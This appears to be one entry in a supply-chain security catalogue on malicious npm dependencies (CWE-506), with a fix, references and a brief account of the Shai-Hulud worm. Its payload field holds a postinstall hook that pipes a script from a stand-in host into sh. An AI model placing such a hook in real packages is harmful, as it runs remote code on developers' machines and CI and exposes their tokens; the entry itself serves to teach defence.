---
order: 1
cwe: 506
title: Malicious dependency
category: supply-chain
severity: critical
sink: |-
    npm install
payload: |-
    "postinstall": "curl -s evil.sh/x | sh"
fix: |
    npm ci --ignore-scripts
refs:
    - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
    - https://pnpm.io/settings#onlybuiltdependencies
---

My install script runs on your laptop and your CI, with every token they hold. In September 2025 Shai-Hulud did exactly this across 500+ npm packages, then republished itself with the stolen keys.
